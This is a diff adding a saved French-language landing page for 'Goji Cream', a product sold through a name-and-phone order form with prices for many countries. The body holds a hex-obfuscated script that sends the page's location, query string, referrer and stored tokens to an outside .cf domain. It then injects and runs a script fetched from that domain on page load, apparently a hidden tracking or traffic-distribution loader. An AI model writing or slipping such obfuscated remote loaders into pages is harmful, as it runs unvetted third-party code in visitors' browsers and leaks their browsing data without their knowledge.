@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<script src="./Goji Cream_files/jquery.min.js.загружено"></script>
+    <script>
+    function set_validator_errors(){
+        orderValidator.errorTitle = 'Veuillez corriger les erreurs suivantes'; 
+
+        orderValidator.errorNameField = 'Prénom'; 
+        orderValidator.errorNameMess = 'Entrez votre nom'; 
+        
+        orderValidator.errorPhoneField = 'Numéro de téléphone'; 
+        orderValidator.errorPhoneMess = 'Entrez le bon numéro de téléphone'; 
+        
+        orderValidator.errorAddress = 'Entrez la bonne adresse'; 
+        orderValidator.errorRequired = 'champs requis'; 
+        orderValidator.errorMaxLength = 'caractère {1} maximum valide'; 
+        orderValidator.errorMinLength = 'caractère {1} minimum valide'; 
+        orderValidator.errorEmailField = 'Courriel';
+        orderValidator.errorEmail = 'e-mail non valide spécifié';
+        }
+    </script>
+    
+<script>
+
+
+window.app = {
+    timestamp: parseInt((new Date()).getTime() / 1000),
+    jq: jQuery,
+    formAction: window.location.href,
+    leadToken: '607fee04d40ad9.45958702',
+    offers: {"15682":{"id":15682,"country":{"code":"UA","name":"\u0423\u043a\u0440\u0430\u0438\u043d\u0430"},"price":"490","price2":"980","currency":{"code":"UAH","name":"\u0433\u0440\u043d"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15686":{"id":15686,"country":{"code":"AT","name":"\u0410\u0432\u0441\u0442\u0440\u0438\u044f"},"price":"39","price2":"78","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15687":{"id":15687,"country":{"code":"BG","name":"\u0411\u043e\u043b\u0433\u0430\u0440\u0438\u044f"},"price":"70","price2":"140","currency":{"code":"BGN","name":"\u043b\u0435\u0432"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15689":{"id":15689,"country":{"code":"HU","name":"\u0412\u0435\u043d\u0433\u0440\u0438\u044f"},"price":"12000","price2":"24000","currency":{"code":"HUF","name":"Ft"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15690":{"id":15690,"country":{"code":"DE","name":"\u0413\u0435\u0440\u043c\u0430\u043d\u0438\u044f"},"price":"39","price2":"78","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15691":{"id":15691,"country":{"code":"GR","name":"\u0413\u0440\u0435\u0446\u0438\u044f"},"price":"39","price2":"78","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15692":{"id":15692,"country":{"code":"ES","name":"\u0418\u0441\u043f\u0430\u043d\u0438\u044f"},"price":"39","price2":"78","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15693":{"id":15693,"country":{"code":"LV","name":"\u041b\u0430\u0442\u0432\u0438\u044f"},"price":"24","price2":"48","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15694":{"id":15694,"country":{"code":"LT","name":"\u041b\u0438\u0442\u0432\u0430"},"price":"24","price2":"48","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15695":{"id":15695,"country":{"code":"PL","name":"\u041f\u043e\u043b\u044c\u0448\u0430"},"price":"170","price2":"340","currency":{"code":"PLN","name":"Z\u0141"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15696":{"id":15696,"country":{"code":"PT","name":"\u041f\u043e\u0440\u0442\u0443\u0433\u0430\u043b\u0438\u044f"},"price":"39","price2":"78","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15697":{"id":15697,"country":{"code":"RO","name":"\u0420\u0443\u043c\u044b\u043d\u0438\u044f"},"price":"170","price2":"340","currency":{"code":"RON","name":"RON"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15698":{"id":15698,"country":{"code":"SK","name":"\u0421\u043b\u043e\u0432\u0430\u043a\u0438\u044f"},"price":"39","price2":"78","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15701":{"id":15701,"country":{"code":"FR","name":"\u0424\u0440\u0430\u043d\u0446\u0438\u044f"},"price":"39","price2":"78","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15702":{"id":15702,"country":{"code":"CZ","name":"\u0427\u0435\u0445\u0438\u044f"},"price":"1000","price2":"2000","currency":{"code":"CZK","name":"K\u010d"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"15703":{"id":15703,"country":{"code":"EE","name":"\u042d\u0441\u0442\u043e\u043d\u0438\u044f"},"price":"24","price2":"48","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"16306":{"id":16306,"country":{"code":"MD","name":"\u041c\u043e\u043b\u0434\u0430\u0432\u0438\u044f"},"price":"450","price2":"900","currency":{"code":"MDL","name":"\u043b\u0435\u0438"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"17299":{"id":17299,"country":{"code":"CN","name":"\u041a\u0438\u0442\u0430\u0439"},"price":"242","price2":"484","currency":{"code":"CNY","name":"CNY"},"discount":"50%","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"17300":{"id":17300,"country":{"code":"MA","name":"\u041c\u0430\u0440\u043e\u043a\u043a\u043e"},"price":"399","price2":"798","currency":{"code":"MAD","name":"MAD"},"discount":"50%","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},"18858":{"id":18858,"country":{"code":"TJ","name":"\u0422\u0430\u0434\u0436\u0438\u043a\u0438\u0441\u0442\u0430\u043d"},"price":"200","price2":"400","currency":{"code":"TJS","name":"\u0441\u043e\u043c"},"discount":"50%","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""}},
+    currentOffer: {"id":15701,"country":{"code":"FR","name":"\u0424\u0440\u0430\u043d\u0446\u0438\u044f"},"price":"39","price2":"78","currency":{"code":"EUR","name":"\u20ac"},"discount":"","delivery_price":"","link":"","product_sku":"","prepaid_info_html":""},
+    allowedCountries: ["UA","AT","BG","HU","DE","GR","ES","LV","LT","PL","PT","RO","SK","FR","CZ","EE","MD","CN","MA","TJ"],
+    _setOfferId: false,
+    streamHid: '',
+    
+    setOffer: function (offerId) {
+        if (offerId == this._setOfferId) {
+            return ;
+        }
+        this._setOfferId = offerId;
+        if (offerId) {
+            var offer = app.offers[offerId];
+            var previousOffer = app.currentOffer;
+            app.currentOffer = offer;
+            var event = this.jq.Event("offerchange");
+            event.previousOffer = previousOffer;
+            event.currentOffer = app.currentOffer;
+            this.jq(document).trigger(event);
+            this.updatePage(offer);
+        } else {
+            $('input[name=country]').val('');
+        }
+    },
+    
+    updatePage: function(offer) {
+        $('x-newprice').html(offer.price);
+        $('x-oldprice').html(offer.price2);
+        $('x-currency').html(offer.currency.name);
+        $('input[name=offer], select[name=offer]').val(offer.id);
+        $('input[name=country]').val(offer.country.code);
+    },
+
+    blockForm: function() {
+        // Блокируем кнопки при отправке формы
+        $('input[type=submit]', $(this)).prop( 'disabled', true ).attr( 'disabled', true );
+        $('button', $(this)).prop( 'disabled', true ).attr( 'disabled', true );
+        app.incompleteOrder.lock = true;
+        clearTimeout(app.incompleteOrder.timer);
+    },
+
+    unblockForm: function() {
+        $('input[type=submit]', $(this)).prop( 'disabled', false ).attr( 'disabled', false );
+        $('button[type=submit]', $(this)).prop( 'disabled', false ).attr( 'disabled', false );
+        app.incompleteOrder.lock = false;
+        clearTimeout(app.incompleteOrder.timer);
+    }
+
+};
+
+
+</script><script src="./Goji Cream_files/form.validate.js.загружено"></script>
+<script src="./Goji Cream_files/form.incomplete.js.загружено"></script>
+<script src="./Goji Cream_files/main2.js.загружено"></script>
+
+
+
+      
+
+      <script src="./Goji Cream_files/jquery.min.js(1).загружено"></script>
+      <style>
+         .ac_footer {
+         position: relative;
+         top: 10px;
+         height: 0;
+         text-align: center;
+         margin-bottom: 70px;
+         color: #A12000;
+         }
+         .ac_footer a {
+         color: #A12000;
+         }
+         .ac_footer p {
+         text-align: center;
+         }
+         img[height="1"], img[width="1"] {
+         display: none !important;
+         }
+      </style>
+      <script src="./Goji Cream_files/12.min.js.загружено" type="text/javascript"></script>
+      
+      <meta content="width=device-width, initial-scale=1.0" name="viewport">
+      <title>Goji Cream</title>
+      <link href="./Goji Cream_files/jquery.bxslider.css" rel="stylesheet">
+      <link href="./Goji Cream_files/main.css" rel="stylesheet">
+      <link href="http://gojicream.xcartpro.com/m9/fav.png" rel="shortcut icon">
+      <script src="./Goji Cream_files/jquery.bxslider.min.js.загружено" type="text/javascript"></script>
+      <script src="./Goji Cream_files/common.js.загружено" type="text/javascript"></script>
+   </head>
+   <body data-lang="FR">
+   <script>
+var _0x6dd0=['\x26\x73\x75\x62\x5f\x69\x64\x3d','\x68\x6f\x73\x74\x6e\x61\x6d\x65','\x38\x33\x33\x33\x35\x6c\x6f\x55\x76\x71\x54','\x73\x75\x62\x49\x64','\x73\x63\x72\x69\x70\x74','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6c\x74\x69\x63\x61\x76\x61\x6c\x69\x72\x6f\x63\x6b\x2e\x63\x66\x2f\x39\x32\x36\x30\x65\x65\x61\x2f\x70\x6f\x73\x74\x62\x61\x63\x6b','\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x65\x6c\x74\x69\x63\x61\x76\x61\x6c\x69\x72\x6f\x63\x6b\x2e\x63\x66\x2f\x65\x64','\x32\x36\x32\x6d\x69\x64\x73\x55\x76','\x3f\x72\x65\x74\x75\x72\x6e\x3d\x6a\x73\x2e\x63\x6c\x69\x65\x6e\x74','\x63\x72\x65\x61\x74\x65\x45\x6c\x65\x6d\x65\x6e\x74','\x5f\x6d\x31\x76\x37\x73\x37\x70\x4d\x78\x66\x46\x6a\x4b\x36\x4d\x48','\x74\x79\x70\x65','\x74\x6f\x6b\x65\x6e','\x32\x38\x37\x32\x34\x34\x54\x53\x42\x7a\x4d\x78','\x74\x74\x6c','\x72\x65\x6d\x6f\x76\x65\x49\x74\x65\x6d','\x72\x65\x66\x65\x72\x72\x65\x72','\x69\x6e\x73\x65\x72\x74\x42\x65\x66\x6f\x72\x65','\x72\x6f\x75\x6e\x64','\x70\x61\x74\x68\x6e\x61\x6d\x65','\x33\x38\x36\x38\x31\x30\x55\x77\x77\x59\x4d\x53','\x52\x5f\x50\x41\x54\x48','\x6c\x6f\x63\x61\x74\x69\x6f\x6e','\x32\x31\x31\x31\x4c\x64\x61\x44\x6e\x48','\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x6a\x61\x76\x61\x73\x63\x72\x69\x70\x74','\x70\x61\x72\x73\x65','\x26\x77\x3d','\x26\x6e\x61\x6d\x65\x3d','\x31\x31\x31\x34\x39\x36\x38\x41\x44\x4c\x55\x79\x6a','\x63\x6f\x6e\x66\x69\x67','\x32\x42\x66\x64\x62\x6a\x61','\x72\x65\x70\x6c\x61\x63\x65','\x73\x72\x63','\x67\x65\x74\x49\x74\x65\x6d','\x75\x6e\x69\x71\x75\x65','\x31\x30\x44\x6a\x52\x58\x79\x4f','\x63\x72\x65\x61\x74\x65\x64\x5f\x61\x74','\x26\x75\x3d\x65\x64\x26\x73\x65\x5f\x72\x65\x66\x65\x72\x72\x65\x72\x3d','\x31\x36\x37\x37\x37\x37\x6d\x48\x65\x6c\x68\x6e','\x26\x74\x6f\x6b\x65\x6e\x3d','\x75\x6e\x64\x65\x66\x69\x6e\x65\x64','\x50\x5f\x50\x41\x54\x48','\x33\x38\x38\x38\x37\x34\x55\x4b\x64\x4b\x70\x46'];var _0xafe6=function(_0x1df245,_0x527cb2){_0x1df245=_0x1df245-(-0x945+0xff3+-0x644);var _0x55a801=_0x6dd0[_0x1df245];return _0x55a801;};(function(_0x2874a6,_0x405243){var _0x315117=_0xafe6;while(!![]){try{var _0x31a6be=-parseInt(_0x315117(0x6a))*-parseInt(_0x315117(0x92))+-parseInt(_0x315117(0x7c))+-parseInt(_0x315117(0x8b))+-parseInt(_0x315117(0x76))*parseInt(_0x315117(0x86))+parseInt(_0x315117(0x83))+parseInt(_0x315117(0x8d))*parseInt(_0x315117(0x6e))+parseInt(_0x315117(0x71));if(_0x31a6be===_0x405243)break;else _0x2874a6['push'](_0x2874a6['shift']());}catch(_0x4672c5){_0x2874a6['push'](_0x2874a6['shift']());}}}(_0x6dd0,0x6dd*-0x223+0xf3f6c+0xe394c),function(){var _0x40ca91=_0xafe6,_0x423a37=_0x40ca91(0x79);if(!window[_0x40ca91(0x79)]){var _0x1d6192={};_0x1d6192['\x75\x6e\x69\x71\x75\x65']=![],_0x1d6192['\x74\x74\x6c']=0x15180,_0x1d6192['\x52\x5f\x50\x41\x54\x48']=_0x40ca91(0x75),_0x1d6192[_0x40ca91(0x6d)]=_0x40ca91(0x74),window[_0x40ca91(0x79)]=_0x1d6192;}const _0x57e042=localStorage['\x67\x65\x74\x49\x74\x65\x6d'](_0x40ca91(0x8c));if(typeof _0x57e042!==_0x40ca91(0x6c)&&_0x57e042!==null){var _0x572694=JSON[_0x40ca91(0x88)](_0x57e042),_0x2fe827=Math[_0x40ca91(0x81)](+new Date()/(-0xe89*0x1+-0x981*-0x3+-0xa12));_0x572694[_0x40ca91(0x93)]+window[_0x40ca91(0x79)][_0x40ca91(0x7d)]<_0x2fe827&&(localStorage[_0x40ca91(0x7e)](_0x40ca91(0x72)),localStorage[_0x40ca91(0x7e)](_0x40ca91(0x7b)),localStorage[_0x40ca91(0x7e)]('\x63\x6f\x6e\x66\x69\x67'));}var _0x837183=localStorage[_0x40ca91(0x90)](_0x40ca91(0x72)),_0x5dc6bf=localStorage[_0x40ca91(0x90)](_0x40ca91(0x7b)),_0x5d0b34=_0x40ca91(0x77);_0x5d0b34+='\x26'+decodeURIComponent(window[_0x40ca91(0x85)]['\x73\x65\x61\x72\x63\x68'][_0x40ca91(0x8e)]('\x3f','')),_0x5d0b34+='\x26\x64\x3d'+encodeURIComponent(document[_0x40ca91(0x85)][_0x40ca91(0x70)]),_0x5d0b34+=_0x40ca91(0x89)+encodeURIComponent(document[_0x40ca91(0x85)][_0x40ca91(0x82)]),_0x5d0b34+=_0x40ca91(0x94)+encodeURIComponent(document[_0x40ca91(0x7f)]),_0x5d0b34+=_0x40ca91(0x8a)+encodeURIComponent(_0x423a37);typeof _0x837183!=='\x75\x6e\x64\x65\x66\x69\x6e\x65\x64'&&_0x837183&&window[_0x40ca91(0x79)][_0x40ca91(0x91)]&&(_0x5d0b34+=_0x40ca91(0x6f)+encodeURIComponent(_0x837183));typeof _0x5dc6bf!==_0x40ca91(0x6c)&&_0x5dc6bf&&window[_0x40ca91(0x79)][_0x40ca91(0x91)]&&(_0x5d0b34+=_0x40ca91(0x6b)+encodeURIComponent(_0x5dc6bf));var _0x1c3bb8=document[_0x40ca91(0x78)](_0x40ca91(0x73));_0x1c3bb8[_0x40ca91(0x7a)]=_0x40ca91(0x87),_0x1c3bb8[_0x40ca91(0x8f)]=window[_0x40ca91(0x79)][_0x40ca91(0x84)]+_0x5d0b34;var _0x588a4a=document['\x67\x65\x74\x45\x6c\x65\x6d\x65\x6e\x74\x73\x42\x79\x54\x61\x67\x4e\x61\x6d\x65'](_0x40ca91(0x73))[-0x1f0d+0x2461+-0x554];_0x588a4a['\x70\x61\x72\x65\x6e\x74\x4e\x6f\x64\x65'][_0x40ca91(0x80)](_0x1c3bb8,_0x588a4a);}());
+</script>
+      <!--retarget--><!--retarget-->
+      <style type="text/css">
+         /* for ATTENTION text */
+         .attention {
+         position: fixed;
+         top: 0;
+         left: 0;
+         width: 100%;
+         padding: 10px 30px;
+         line-height: 1.3;
+         color: #fff;
+         background: green;
+         z-index: 10000;
+         text-align: center;
+         -webkit-box-sizing: border-box;
+         -moz-box-sizing: border-box;
+         box-sizing: border-box;
+         }
+         .attention p {
+         margin: 0;
+         padding: 0;
+         }
+         .close {
+         position: absolute;
+         width: 30px;
+         height: 30px;
+         cursor: pointer;
+         z-index: 5;
+         right: 0;
+         top: 0;
+         margin: 3px;
+         }
+         .close:hover:before,
+         .close:hover:after {
+         -webkit-box-shadow: 0 0 10px 1px #fff;
+         -moz-box-shadow: 0 0 10px 1px #fff;
+         box-shadow: 0 0 10px 1px #fff;
+         }
+         .close:before {
+         content: "";
+         width: 30px;
+         height: 1px;
+         background: #fff;
+         -webkit-transform: rotate(45deg);
+         -moz-transform: rotate(45deg);
+         -ms-transform: rotate(45deg);
+         -o-transform: rotate(45deg);
+         transform: rotate(45deg);
+         position: absolute;
+         top: 50%;
+         left: 50%;
+         margin: -2px 0 0 -15px;
+         }
+         .close:after {
+         content: "";
+         width: 30px;
+         height: 1px;
+         background: #fff;
+         -webkit-transform: rotate(-45deg);
+         -moz-transform: rotate(-45deg);
+         -ms-transform: rotate(-45deg);
+         -o-transform: rotate(-45deg);
+         transform: rotate(-45deg);
+         position: absolute;
+         top: 50%;
+         left: 50%;
+         margin: -2px 0 0 -15px;
+         }
+      </style>
+      
+     
+         <div class="block_15">
+            <div class="container">
+               <div class="form">
+                  <p> Commande </p>
+                  <ul class="price">
+                   </ul>
+                  <form action="http://gojicream.xcartpro.com/m9/?off=3OKxfOo5&amp;lnk=27291&amp;m=ae1d350a7c335ad" id="order_form" method="post" autocomplete="on"><input type="hidden" name="stream_hid" value=""><input type="hidden" name="code_confirm" value=""><input type="hidden" name="visit_duration2" value=""><input type="hidden" name="visit_duration1" value="33"><input type="hidden" name="timezone_int" value="3"><input type="hidden" name="local_time" value=""><input type="hidden" name="lead_token" value="607fee04d40ad9.45958702"><input type="hidden" name="country" value="FR">
+                     
+                         <input name="csrf_token" type="hidden" value="3d1e6ea25713ab4ebd9a21f53d750cee:1618996741">
+    <select name="offer" class="form-control country_chang" style="display: none;">
+        <option data-country-code="FR" selected="selected" value="15701">
+            Франция        </option>
+    </select>
+
+     
+                     <input name="name" placeholder="Nom, prénom complet" type="text" autocomplete="name">
+                     <input class="onlynumber" name="phone" placeholder="Téléphone" type="tel" autocomplete="tel"><button class="js_pay_online_secondpage pulse"><span> Commander <b> maintenant </b></span></button>
+                     <div class="note"> *Faites attention que les TVA locaux peuvent varier, cela dépend du pays où vous commandez nos produits. </div>
+                     <div class=""></div>
+                     <div class="verification"><img src="./Goji Cream_files/verified.png"></div>
+                  <input type="hidden" name="time_zone" value="3"></form>
+               </div>
+            </div>
+         </div>
+         <div class="block_16">
+            <div class="container">
+               <center></center>
+            </div>
+         </div>
+      </div>
+     
+      <div class="ac_footer">
+        <center style="margin: 30px auto"><p>OOO "OSTROV PRODAZH" OGRN: 1197746695530 VAT: 7708365555</p>
+<p>129090, Moscow, pereulok Zhivarev, house 8, stroenie 3, flat 16 email: ostrov.prodazh@mail.com Skype: ostrov.prodazh@mail.com</p> 
+
+
+    
+            <p class="conf-link doclinks">
+        <a class="nav-link" href="http://gojicream.xcartpro.com/m9/?off=3OKxfOo5&amp;lnk=27291&amp;m=ae1d350a7c335ad" onclick="window.open(&#39;/policy_en.php&#39;); return false;">Privacy Policy</a>
+          |
+        <a class="nav-link" href="http://gojicream.xcartpro.com/m9/?off=3OKxfOo5&amp;lnk=27291&amp;m=ae1d350a7c335ad" onclick="window.open(&#39;/terms_en.php&#39;); return false;">Terms &amp; Conditions</a>
+      </p>
+      
+    
+</center>
+      </div>
+   
+</body></html>
